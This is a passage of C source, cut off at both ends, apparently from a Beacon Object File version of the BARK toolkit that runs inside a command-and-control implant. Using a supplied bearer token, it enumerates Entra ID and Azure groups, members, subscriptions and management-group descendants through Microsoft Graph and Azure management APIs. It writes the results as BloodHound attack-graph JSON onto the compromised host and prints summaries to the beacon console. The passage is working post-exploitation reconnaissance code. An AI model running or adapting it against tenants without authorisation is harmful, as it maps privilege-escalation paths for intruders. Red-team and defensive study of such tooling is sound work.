        if (dataSuffix) {
            BarkBufAppend(b, "\",", 2);
            BarkBufAppend(b, dataSuffix, MSVCRT$strlen(dataSuffix));
            BarkBufAppend(b, "}}", 2);
        } else {
            BarkBufAppend(b, "\"}}", 3);
        }
        (*emitted)++;
    } else {
        b->len = savedLen;
        if (b->buf) b->buf[b->len] = '\0';
    }

    HFree(hdrWide);
    HFree(widePath);
    if (nextUrl)  HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    if (!collectionComplete && stats) stats->failedParents++;
    if (childCount > 0 && stats) stats->emittedParents++;
    return childCount;
}

/* One worker owns one parent and one private output buffer. */
static DWORD WINAPI BarkGraphParentWorker(LPVOID parameter) {
    BarkGraphParentJob *job = (BarkGraphParentJob *)parameter;
    job->output.buf = NULL;
    job->output.cap = 0;
    job->output.len = 0;
    job->output.ok = 1;
    job->emitted = 0;
    job->stats.childRequests = 0;
    job->stats.childPages = 0;
    job->stats.childObjects = 0;
    job->stats.emittedParents = 0;
    job->stats.failedParents = 0;

    if (job->extended) {
        EmitGroupedChildrenEx(&job->output, job->bearerToken,
            job->parentCollection, job->parentId, job->outputParentId,
            job->childSuffix,
            job->kind, job->parentIdKey, job->childCollectionKey,
            job->childSingularKey, job->dataSuffix, &job->emitted,
            &job->stats, 0);
    } else {
        EmitGroupedChildren(&job->output, job->bearerToken,
            job->parentCollection, job->parentId, job->outputParentId,
            job->childSuffix,
            job->kind, job->parentIdKey, job->childCollectionKey,
            job->childSingularKey, &job->emitted, &job->stats, 0);
    }
    if (!job->output.ok && job->stats.failedParents == 0)
        job->stats.failedParents++;
    return 0;
}

static void BarkCollectBHGraphGroupedFromIds(
    const char *bearerToken,
    const char *parentCollection,
    const BarkIdList *ids,
    const BarkIdList *outputIds,
    const char *childSuffix,
    const char *kind,
    const char *parentIdKey,
    const char *childCollectionKey,
    const char *childSingularKey,
    const char *dataSuffix,
    int extended,
    int parentEnumerationComplete)
{
    BarkBHChunkWriter writer;
    BarkGraphParentJob jobs[BARK_GRAPH_PARENT_WORKERS];
    HANDLE threads[BARK_GRAPH_PARENT_WORKERS];
    BarkBHCollectionStats total;
    int offset = 0;
    LONG previousQuiet = BarkHttpQuiet;

    total.childRequests = 0;
    total.childPages = 0;
    total.childObjects = 0;
    total.emittedParents = 0;
    total.failedParents = 0;
    BarkBHChunkWriterInit(&writer, kind);
    BarkHttpQuiet = 1;

    while (ids && offset < ids->count) {
        int wave = ids->count - offset;
        int wi;
        if (wave > BARK_GRAPH_PARENT_WORKERS)
            wave = BARK_GRAPH_PARENT_WORKERS;

        for (wi = 0; wi < wave; wi++) {
            BarkGraphParentJob *job = &jobs[wi];
            job->bearerToken = bearerToken;
            job->parentCollection = parentCollection;
            job->parentId = ids->ids[offset + wi];
            job->outputParentId =
                (outputIds && offset + wi < outputIds->count) ?
                    outputIds->ids[offset + wi] : job->parentId;
            job->childSuffix = childSuffix;
            job->kind = kind;
            job->parentIdKey = parentIdKey;
            job->childCollectionKey = childCollectionKey;
            job->childSingularKey = childSingularKey;
            job->dataSuffix = dataSuffix;
            job->extended = extended;
            threads[wi] = KERNEL32$CreateThread(
                NULL, 0, BarkGraphParentWorker, job, 0, NULL);
            if (!threads[wi])
                BarkGraphParentWorker(job);
        }

        for (wi = 0; wi < wave; wi++) {
            if (threads[wi]) {
                KERNEL32$WaitForSingleObject(threads[wi], INFINITE);
                KERNEL32$CloseHandle(threads[wi]);
                threads[wi] = NULL;
            }
            BarkBHChunkWriterAppend(&writer, &jobs[wi].output);
            total.childRequests += jobs[wi].stats.childRequests;
            total.childPages += jobs[wi].stats.childPages;
            total.childObjects += jobs[wi].stats.childObjects;
            total.emittedParents += jobs[wi].stats.emittedParents;
            total.failedParents += jobs[wi].stats.failedParents;
            BarkBufFree(&jobs[wi].output);
        }
        offset += wave;
    }

    BarkHttpQuiet = previousQuiet;
    writer.includeCollectionSummary =
        kind && MSVCRT$strcmp(kind, "AZGroupMember") == 0;
    writer.requestedParents = ids ? ids->count : 0;
    writer.failedParents = total.failedParents;
    writer.successfulParents = writer.requestedParents - writer.failedParents;
    if (writer.successfulParents < 0) writer.successfulParents = 0;
    writer.collectionComplete = parentEnumerationComplete &&
        writer.failedParents == 0;
    BarkBHChunkWriterFlush(&writer, 1);
    BarkBufFree(&writer.buffer);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] BARK %s: parents=%d emitted=%d childObjects=%d childRequests=%d pages=%d attempts=%ld retries=%ld 429=%ld failedParents=%d chunks=%d\n",
        kind, ids ? ids->count : 0, total.emittedParents,
        total.childObjects, total.childRequests, total.childPages,
        (long)BarkHttpRequestCount, (long)BarkHttpRetryCount,
        (long)BarkHttp429Count, total.failedParents, writer.part);
}

static void BarkGetBHGraphGroupedFromIds(const char *bearerToken,
                                          const char *parentCollection,
                                          const BarkIdList *ids,
                                          const char *childSuffix,
                                          const char *kind,
                                          const char *parentIdKey,
                                          const char *childCollectionKey,
                                          const char *childSingularKey) {
    BarkCollectBHGraphGroupedFromIds(bearerToken, parentCollection, ids, NULL,
        childSuffix, kind, parentIdKey, childCollectionKey,
        childSingularKey, NULL, 0, 1);
}

static void BarkGetBHGraphGroupedFromIdsWithStatus(
    const char *bearerToken,
    const char *parentCollection,
    const BarkIdList *ids,
    const char *childSuffix,
    const char *kind,
    const char *parentIdKey,
    const char *childCollectionKey,
    const char *childSingularKey,
    int parentEnumerationComplete) {
    BarkCollectBHGraphGroupedFromIds(bearerToken, parentCollection, ids, NULL,
        childSuffix, kind, parentIdKey, childCollectionKey,
        childSingularKey, NULL, 0, parentEnumerationComplete);
}

static void BarkGetBHGraphGroupedExFromIds(const char *bearerToken,
                                           const char *parentCollection,
                                           const BarkIdList *ids,
                                           const char *childSuffix,
                                           const char *kind,
                                           const char *parentIdKey,
                                           const char *childCollectionKey,
                                           const char *childSingularKey,
                                           const char *dataSuffix) {
    BarkCollectBHGraphGroupedFromIds(bearerToken, parentCollection, ids, NULL,
        childSuffix, kind, parentIdKey, childCollectionKey,
        childSingularKey, dataSuffix, 1, 1);
}

static void BarkGetBHGraphGroupedFromIdMap(const char *bearerToken,
                                           const char *parentCollection,
                                           const BarkIdList *requestIds,
                                           const BarkIdList *outputIds,
                                           const char *childSuffix,
                                           const char *kind,
                                           const char *parentIdKey,
                                           const char *childCollectionKey,
                                           const char *childSingularKey) {
    BarkCollectBHGraphGroupedFromIds(bearerToken, parentCollection,
        requestIds, outputIds, childSuffix, kind, parentIdKey,
        childCollectionKey, childSingularKey, NULL, 0, 1);
}

static void BarkGetBHGraphGroupedExFromIdMap(const char *bearerToken,
                                             const char *parentCollection,
                                             const BarkIdList *requestIds,
                                             const BarkIdList *outputIds,
                                             const char *childSuffix,
                                             const char *kind,
                                             const char *parentIdKey,
                                             const char *childCollectionKey,
                                             const char *childSingularKey,
                                             const char *dataSuffix) {
    BarkCollectBHGraphGroupedFromIds(bearerToken, parentCollection,
        requestIds, outputIds, childSuffix, kind, parentIdKey,
        childCollectionKey, childSingularKey, dataSuffix, 1, 1);
}

/* Grouped variant with optional single-parent mode. */
static void BarkGetBHGraphGrouped(const char *bearerToken,
                                   const char *parentCollection,
                                   const char *parentId,
                                   const char *childSuffix,
                                   const char *kind,
                                   const char *parentIdKey,
                                   const char *childCollectionKey,
                                   const char *childSingularKey) {
    BarkIdList ids;
    int ownsList = 0;
    int parentEnumerationComplete = 0;
    BarkIdListInit(&ids);
    BarkHttpMetricsReset();

    if (parentId && MSVCRT$strlen(parentId) > 0) {
        parentEnumerationComplete =
            BarkIdListAppend(&ids, (char *)parentId) == 0;
    } else {
        char parentPath[512];
        ownsList = 1;
        MSVCRT$sprintf_s(parentPath, sizeof(parentPath),
            "/v1.0/%s?$top=999&$select=id", parentCollection);
        ids = BarkEnumEntityIdsWithStatus(L"graph.microsoft.com", parentPath,
            bearerToken, "\"id\"", &parentEnumerationComplete);
    }

    if (ids.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No %s found for %s enumeration\n",
            parentCollection, childSuffix);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Found %d %s, enumerating %s with %d workers...\n",
            ids.count, parentCollection, childSuffix,
            BARK_GRAPH_PARENT_WORKERS);
    }
    if (ids.count > 0 ||
        (kind && MSVCRT$strcmp(kind, "AZGroupMember") == 0)) {
        BarkGetBHGraphGroupedFromIdsWithStatus(
            bearerToken, parentCollection, &ids,
            childSuffix, kind, parentIdKey, childCollectionKey,
            childSingularKey, parentEnumerationComplete);
    }
    if (ownsList) BarkIdListFree(&ids);
}

/* Grouped variant with optional single-parent mode and dataSuffix. */
static void BarkGetBHGraphGroupedEx(const char *bearerToken,
                                     const char *parentCollection,
                                     const char *parentId,
                                     const char *childSuffix,
                                     const char *kind,
                                     const char *parentIdKey,
                                     const char *childCollectionKey,
                                     const char *childSingularKey,
                                     const char *dataSuffix) {
    BarkIdList ids;
    int ownsList = 0;
    BarkIdListInit(&ids);
    BarkHttpMetricsReset();

    if (parentId && MSVCRT$strlen(parentId) > 0) {
        BarkIdListAppend(&ids, (char *)parentId);
    } else {
        char parentPath[512];
        ownsList = 1;
        MSVCRT$sprintf_s(parentPath, sizeof(parentPath),
            "/v1.0/%s?$top=999&$select=id", parentCollection);
        ids = BarkEnumEntityIds(L"graph.microsoft.com", parentPath,
            bearerToken, "\"id\"");
    }

    if (ids.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No %s found for %s enumeration\n",
            parentCollection, childSuffix);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Found %d %s, enumerating %s with %d workers...\n",
            ids.count, parentCollection, childSuffix,
            BARK_GRAPH_PARENT_WORKERS);
        BarkGetBHGraphGroupedExFromIds(bearerToken, parentCollection, &ids,
            childSuffix, kind, parentIdKey, childCollectionKey,
            childSingularKey, dataSuffix);
    }
    if (ownsList) BarkIdListFree(&ids);
}

/* High-level BH emitter (inner).
 *
 * dataSuffix: if non-NULL, injected before the closing } of each data object.
 *             Callers that don't need extra fields should pass NULL.
 *
 * Collects the entire BloodHound envelope into a heap buffer, then writes
 * it to disk on the target as `.\AZ<Kind>_yyyyMMdd_HHmmss.json` and
 * prints a one-line summary to the beacon console.
 *
 * If file creation fails for any reason, the JSON is dumped to the beacon
 * console as a fall-back so the data is never lost. */
static void BarkGetBHInnerEx(LPCWSTR host, LPCWSTR widePath,
                             const char *bearerToken, const char *kind,
                             const char *dataSuffix, int aliasObjectId) {
    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);

    char tenantBase[64] = "";
    if (widePath && widePath[0] == L'/') {
        int i, end = -1;
        for (i = 1; widePath[i] && i < 60; i++) {
            if (widePath[i] == L'/') { end = i; break; }
        }
        if (end > 0) {
            for (i = 0; i <= end; i++) tenantBase[i] = (char)widePath[i];
            tenantBase[end + 1] = '\0';
        }
    }

    int    emitted    = 0;
    int    isArray    = 0;
    char  *currentUrl = NULL;
    LPWSTR pathWide   = NULL;
    LPCWSTR pathArg   = widePath;

    while (1) {
        char *next = BarkGetBHPageBuf(host, pathArg, bearerToken, kind,
                                      &b, &emitted, &isArray, dataSuffix, aliasObjectId);
        if (currentUrl) { HFree(currentUrl); currentUrl = NULL; }
        if (pathWide)   { HFree(pathWide);   pathWide   = NULL; }
        if (!next) break;

        pathWide = BarkResolveNextLink(next, host, tenantBase);
        currentUrl = next;
        if (!pathWide) break;
        pathArg = pathWide;

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Pagination: %d so far, nextLink: %.80s\n", emitted, next);
    }

    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}",
        emitted);
    if (tailLen > 0)
        BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (!b.ok || !b.buf) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH(%s): out of memory while building BH envelope\n", kind);
        BarkBufFree(&b);
        return;
    }

    /* Build target filename: .\AZ<KindTail>_yyyyMMdd_HHmmss.json */
    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);

    const char *kindShort = kind;
    if (kindShort[0] == 'A' && kindShort[1] == 'Z') kindShort += 2;

    char filename[300];
    MSVCRT$sprintf_s(filename, sizeof(filename),
        ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
        kindShort,
        (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
        (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);

    BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK %s found %d objects\n",
            kind, emitted);
    BarkWriteOutput(filename, b.buf, (DWORD)b.len);

    BarkBufFree(&b);
}

static void BarkGetBHInner(LPCWSTR host, LPCWSTR widePath,
                           const char *bearerToken, const char *kind,
                           const char *dataSuffix) {
    BarkGetBHInnerEx(host, widePath, bearerToken, kind, dataSuffix, 0);
}

static void BarkGetBH(LPCWSTR host, LPCWSTR widePath,
                      const char *bearerToken, const char *kind) {
    BarkGetBHInnerEx(host, widePath, bearerToken, kind, NULL, 0);
}

/* Emit one subscription item with "tenantId" stripped from its original
 * position and appended as the last field of the data object. */
static void BarkBufPrintBHItemMoveTenantId(BarkBuf *b, const char *kind,
                                            const char *item,
                                            const char *itemEnd, int isFirst) {
    BarkBuf assembled = { NULL, 0, 0, 1 };

    char *tid = JsonExtractStringValue(item, itemEnd, "\"tenantId\"");
    const char *kPos = tid ? JsonFindKey(item, itemEnd, "\"tenantId\"") : NULL;

    if (!tid || !kPos || (itemEnd <= item) || *(itemEnd - 1) != '}') {
        /* no tenantId or malformed — emit verbatim */
        BarkBufPrintBHItem(b, kind, item, itemEnd, isFirst, NULL, 0);
        if (tid) HFree(tid);
        return;
    }

    /* Find the span to skip: comma + "tenantId":"<value>" */
    const char *skipStart = kPos;
    {
        const char *p = kPos - 1;
        while (p > item && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p--;
        if (p > item && *p == ',') skipStart = p;
    }

    /* Skip past the key (10 chars for "tenantId") + colon + string value */
    const char *skipEnd = kPos + 10;
    while (skipEnd < itemEnd && (*skipEnd == ' ' || *skipEnd == ':' || *skipEnd == '\t')) skipEnd++;
    if (skipEnd < itemEnd && *skipEnd == '"') {
        skipEnd++;
        while (skipEnd < itemEnd) {
            if (*skipEnd == '\\') { skipEnd += 2; continue; }
            if (*skipEnd == '"')  { skipEnd++; break; }
            skipEnd++;
        }
    }
    /* If no leading comma was consumed, eat a trailing comma instead */
    if (skipStart == kPos) {
        const char *p = skipEnd;
        while (p < itemEnd && (*p == ' ' || *p == '\t')) p++;
        if (p < itemEnd && *p == ',') skipEnd = p + 1;
    }

    /* Emit: item[0..skipStart) + item[skipEnd..itemEnd-1) + ,"tenantId":"<tid>"} */
    BarkBufAppend(&assembled, item, (SIZE_T)(skipStart - item));
    BarkBufAppend(&assembled, skipEnd,
        (SIZE_T)(itemEnd - 1 - skipEnd));
    char sfx[256];
    int sn = MSVCRT$sprintf_s(sfx, sizeof(sfx), ",\"tenantId\":\"%s\"}", tid);
    if (sn > 0) BarkBufAppend(&assembled, sfx, (SIZE_T)sn);
    HFree(tid);

    if (assembled.ok && assembled.buf) {
        BarkBufPrintBHItem(b, kind, assembled.buf,
            assembled.buf + assembled.len, isFirst, NULL, 0);
    }
    BarkBufFree(&assembled);
}

/* ================================================================
 * BarkMgmtGroupFallbackGetSubscriptionIds
 *
 * Discover subscription IDs via management group descendants when
 * the standard /subscriptions endpoint returns empty.
 * Returns a BarkIdList of deduplicated subscription ID strings.
 * Caller must BarkIdListFree the result.
 * Uses BarkEnumEntityIds for mgmt group listing (paginated + retry)
 * and paginated + retry requests for descendants with type filtering.
 * ================================================================ */
static BarkIdList BarkMgmtGroupFallbackGetSubscriptionIdsWithStatus(
    const char *bearerToken, int *collectionComplete)
{
    BarkIdList subs;
    int groupEnumerationComplete = 0;
    int allComplete = 1;
    BarkIdListInit(&subs);
    if (collectionComplete) *collectionComplete = 0;

    BarkIdList mgs = BarkEnumEntityIdsWithStatus(
        L"management.azure.com",
        "/providers/Microsoft.Management/managementGroups?api-version=2020-05-01",
        bearerToken, "\"name\"", &groupEnumerationComplete);
    if (!groupEnumerationComplete) allComplete = 0;

    if (mgs.count == 0) {
        if (collectionComplete) *collectionComplete = allComplete;
        BarkIdListFree(&mgs);
        return subs;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d management group(s), enumerating descendants...\n", mgs.count);

    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) { BarkIdListFree(&mgs); return subs; }

    int mi;
    for (mi = 0; mi < mgs.count; mi++) {
        char pathBuf[512];
        int groupComplete = 1;
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/providers/Microsoft.Management/managementGroups/%s/descendants?api-version=2020-05-01",
            mgs.ids[mi]);
        LPWSTR widePath = MbsToWcs(pathBuf);
        if (!widePath) {
            allComplete = 0;
            continue;
        }

        LPCWSTR pathArg = widePath;
        char  *nextUrl  = NULL;
        LPWSTR nextWide = NULL;

        while (1) {
            DWORD status = 0;
            int pageValid = 0;
            char *resp = HttpRequestWithRetry(L"GET", L"management.azure.com",
                pathArg, hdrWide, NULL, 0, &status);

            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }

            if (!resp || status >= 400) {
                if (resp) HFree(resp);
                groupComplete = 0;
                break;
            }

            SIZE_T respLen = MSVCRT$strlen(resp);
            const char *end = resp + respLen;
            const char *vKey = JsonFindKey(resp, end, "\"value\"");
            if (vKey) {
                const char *colon = JsonFindKey(vKey, end, ":");
                if (colon) {
                    colon++;
                    while (colon < end && (*colon == ' ' || *colon == '\t' ||
                           *colon == '\n' || *colon == '\r')) colon++;
                    if (colon < end && *colon == '[') {
                        const char *arrEnd = JsonSkipBalanced(colon, end);
                        if (arrEnd) {
                            const char *p = colon + 1;
                            pageValid = 1;
                            while (p < arrEnd - 1) {
                                while (p < arrEnd - 1 && *p != '{') p++;
                                if (p >= arrEnd - 1) break;
                                const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                                if (!itemEnd) {
                                    pageValid = 0;
                                    break;
                                }
                                char *dtype = JsonExtractStringValue(p, itemEnd, "\"type\"");
                                if (dtype) {
                                    if (MSVCRT$strstr(dtype, "subscriptions")) {
                                        char *name = JsonExtractStringValue(p, itemEnd, "\"name\"");
                                        if (name && MSVCRT$strlen(name) > 0) {
                                            /* Descendant names are subscription IDs; apply the same boundary checks. */
                                            if (!BarkNormalizeAzureSubscriptionId(name) ||
                                                BarkIdListAppendUnique(&subs, name) != 0)
                                                HFree(name);
                                        } else if (name) HFree(name);
                                    }
                                    HFree(dtype);
                                }
                                p = itemEnd;
                            }
                        }
                    }
                }
            }

            if (!pageValid) {
                groupComplete = 0;
                HFree(resp);
                break;
            }

            nextUrl = JsonExtractNextLink(resp, end);
            HFree(resp);
            if (!nextUrl) break;

            char *np = nextUrl;
            if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
            else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
            char *slash = MSVCRT$strstr(np, "/");
            nextWide = MbsToWcs(slash ? slash : nextUrl);
            if (!nextWide) {
                groupComplete = 0;
                break;
            }
            pathArg = nextWide;
        }
        HFree(widePath);
        if (nextUrl)  HFree(nextUrl);
        if (nextWide) HFree(nextWide);
        if (!groupComplete) allComplete = 0;
    }

    HFree(hdrWide);
    BarkIdListFree(&mgs);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Discovered %d subscription(s) via management group descendants\n",
        subs.count);
    if (collectionComplete) *collectionComplete = allComplete;
    return subs;
}

static BarkIdList BarkMgmtGroupFallbackGetSubscriptionIds(
    const char *bearerToken)
{
    return BarkMgmtGroupFallbackGetSubscriptionIdsWithStatus(
        bearerToken, NULL);
}

/* ================================================================
 * BarkGetSubscriptionsRawWithFallback
 *
 * GET /subscriptions and print the response.  If the "value" array
 * is empty, fall back to management group descendants to discover
 * subscription IDs, then GET each individual subscription.
 * ================================================================ */
static void BarkGetSubscriptionsRawWithFallback(const char *bearerToken) {
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return;

    int needFallback = 1;
    DWORD status = 0;
    char *resp = HttpRequestWithRetry(L"GET", L"management.azure.com",
        L"/subscriptions?api-version=2020-01-01",
        hdrWide, NULL, 0, &status);
    if (!resp) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] /subscriptions request failed (HTTP %lu), trying management group fallback...\n",
            (unsigned long)status);
    } else if (status >= 400) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] /subscriptions returned HTTP %lu, trying management group fallback...\n",
            (unsigned long)status);
        HFree(resp);
        resp = NULL;
    } else {
        /* Check if "value" array is empty */
        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *end = resp + respLen;
        const char *vKey = JsonFindKey(resp, end, "\"value\"");
        if (vKey) {
            const char *colon = JsonFindKey(vKey, end, ":");
            if (colon) {
                colon++;
                while (colon < end && (*colon == ' ' || *colon == '\t' ||
                       *colon == '\n' || *colon == '\r')) colon++;
                if (colon < end && *colon == '[') {
                    const char *after = colon + 1;
                    while (after < end && (*after == ' ' || *after == '\t' ||
                           *after == '\n' || *after == '\r')) after++;
                    if (after < end && *after != ']')
                        needFallback = 0;
                }
            }
        }

        if (!needFallback) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp);
            HFree(resp);
            HFree(hdrWide);
            return;
        }
        HFree(resp);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] /subscriptions returned empty, trying management group fallback...\n");
    }

    BarkIdList fbSubs = BarkMgmtGroupFallbackGetSubscriptionIds(bearerToken);
    if (fbSubs.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] No subscriptions found via fallback either\n");
        BarkIdListFree(&fbSubs);
        HFree(hdrWide);
        return;
    }

    int si;
    for (si = 0; si < fbSubs.count; si++) {
        static char pathBuf[512];
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/subscriptions/%s?api-version=2020-01-01", fbSubs.ids[si]);
        LPWSTR widePath = MbsToWcs(pathBuf);
        if (!widePath) continue;

        status = 0;
        resp = HttpRequestWithRetry(L"GET", L"management.azure.com",
            widePath, hdrWide, NULL, 0, &status);
        HFree(widePath);
        if (resp) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp);
            HFree(resp);
        }
    }
    BarkIdListFree(&fbSubs);
    HFree(hdrWide);
}

/* Fetch Azure subscriptions in BH format, with tenantId as the last data field. */
static void BarkGetBHSubscriptions(const char *bearerToken) {
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return;

    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    int    emitted    = 0;
    int    isArray    = 0;
    char  *currentUrl = NULL;
    LPWSTR pathWide   = NULL;
    LPCWSTR pathArg   = L"/subscriptions?api-version=2020-01-01";

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"management.azure.com", pathArg, hdrWide, NULL, 0, &status);
        if (pathWide)   { HFree(pathWide);   pathWide   = NULL; }
        if (currentUrl) { HFree(currentUrl); currentUrl = NULL; }
        if (!resp) break;
        if (status >= 400) {
            BeaconPrintf(CALLBACK_ERROR, "[-] BarkGetBHSubscriptions: HTTP %lu\n", status);
            HFree(resp);
            break;
        }

        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *end = resp + respLen;
        const char *vKey = JsonFindKey(resp, end, "\"value\"");
        if (vKey) {
            const char *bracket = vKey;
            while (bracket < end && *bracket != '[') bracket++;
            if (bracket < end) {
                const char *arrEnd = JsonSkipBalanced(bracket, end);
                if (arrEnd) {
                    isArray = 1;
                    const char *p = bracket + 1;
                    while (p < arrEnd - 1) {
                        while (p < arrEnd - 1 && *p != '{') p++;
                        if (p >= arrEnd - 1) break;
                        const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                        if (!itemEnd) break;
                        BarkBufPrintBHItemMoveTenantId(&b, "AZSubscription", p, itemEnd, emitted == 0);
                        emitted++;
                        p = itemEnd;
                    }
                }
            }
        }
        if (!isArray) {
            BarkBufPrintBHItemMoveTenantId(&b, "AZSubscription", resp, end, emitted == 0);
            emitted++;
        }

        char *nextUrl = JsonExtractNextLink(resp, end);
        HFree(resp);
        if (!nextUrl) break;
        char *np = nextUrl;
        if (MSVCRT$strncmp(np, "https://", 8) == 0)      np += 8;
        else if (MSVCRT$strncmp(np, "http://", 7) == 0)  np += 7;
        char *slash = MSVCRT$strstr(np, "/");
        pathWide   = MbsToWcs(slash ? slash : nextUrl);
        currentUrl = nextUrl;
        if (!pathWide) break;
        pathArg = pathWide;
    }
    /* Management group fallback when /subscriptions returned nothing */
    if (emitted == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] /subscriptions returned empty, trying management group fallback...\n");

        BarkIdList fbSubs = BarkMgmtGroupFallbackGetSubscriptionIds(bearerToken);

        if (fbSubs.count > 0) {
            int fbi;
            for (fbi = 0; fbi < fbSubs.count; fbi++) {
                static char fbPathBuf[512];
                MSVCRT$sprintf_s(fbPathBuf, sizeof(fbPathBuf),
                    "/subscriptions/%s?api-version=2020-01-01", fbSubs.ids[fbi]);
                LPWSTR fbWidePath = MbsToWcs(fbPathBuf);
                if (!fbWidePath) continue;

                DWORD fbStatus = 0;
                char *fbResp = HttpRequestWithRetry(L"GET", L"management.azure.com",
                    fbWidePath, hdrWide, NULL, 0, &fbStatus);
                HFree(fbWidePath);
                if (fbResp && fbStatus < 400) {
                    SIZE_T fbLen = MSVCRT$strlen(fbResp);
                    const char *fbEnd = fbResp + fbLen;
                    BarkBufPrintBHItemMoveTenantId(&b, "AZSubscription",
                        fbResp, fbEnd, emitted == 0);
                    emitted++;
                }
                if (fbResp) HFree(fbResp);
            }
        }
        BarkIdListFree(&fbSubs);

        if (emitted == 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] No subscriptions found via fallback either\n");
    }

    HFree(hdrWide);

    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZSubscription_%04u%02u%02u_%02u%02u%02u.json",
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK AZSubscription found %d objects\n", emitted);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkBufFree(&b);
}

/* Fetch tenant displayName via legacy AAD Graph:
 * GET graph.windows.net/{tenantId}/tenantDetails?api-version=1.6
 * Returns heap-allocated string or NULL. Caller must HFree. */
static char *BarkFetchTenantDisplayNameLegacy(const char *bearerToken,
                                               const char *tenantId) {
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return NULL;

    char pathBuf[256];
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/%s/tenantDetails?api-version=1.6", tenantId);
    LPWSTR widePath = MbsToWcs(pathBuf);
    if (!widePath) { HFree(hdrWide); return NULL; }

    DWORD status = 0;
    char *resp = HttpRequest(L"GET", L"graph.windows.net",
        widePath, hdrWide, NULL, 0, &status);
    HFree(hdrWide);
    HFree(widePath);
    if (!resp || status >= 400) { if (resp) HFree(resp); return NULL; }

    SIZE_T respLen = MSVCRT$strlen(resp);
    const char *end = resp + respLen;
    char *result = NULL;

    const char *vKey = JsonFindKey(resp, end, "\"value\"");
    if (vKey) {
        const char *colon = JsonFindKey(vKey, end, ":");
        if (colon) {
            colon++;
            while (colon < end && (*colon == ' ' || *colon == '\t' ||
                   *colon == '\n' || *colon == '\r')) colon++;
            if (colon < end && *colon == '[') {
                const char *arrEnd = JsonSkipBalanced(colon, end);
                if (arrEnd) {
                    const char *p = colon + 1;
                    while (p < arrEnd - 1 && *p != '{') p++;
                    if (p < arrEnd - 1) {
                        const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                        if (itemEnd)
                            result = JsonExtractStringValue(p, itemEnd, "\"displayName\"");
                    }
                }
            }
        }
    }
    HFree(resp);
    return result;
}

/* Grouped-children emitter for legacy AAD Graph (graph.windows.net).
 * Like EmitGroupedChildren but uses legacy paths:
 *   /{tenantId}/{parentCollection}/{parentId}/{childSuffix}?api-version=1.6
 * Output format per parent:
 *   {"kind":"<kind>","data":{"<childCollectionKey>":[
 *     {"<parentIdKey>":"<id>","<childSingularKey>":{...child...}}, ...
 *   ],"<parentIdKey>":"<id>"}}
 * Each child also gets aliased id = objectId injected. */
static void EmitGroupedChildrenLegacy(BarkBuf *b, const char *bearerToken,
                                       const char *tenantId,
                                       const char *parentCollection,
                                       const char *parentId,
                                       const char *childSuffix,
                                       const char *kind,
                                       const char *parentIdKey,
                                       const char *childCollectionKey,
                                       const char *childSingularKey,
                                       int *emitted) {
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
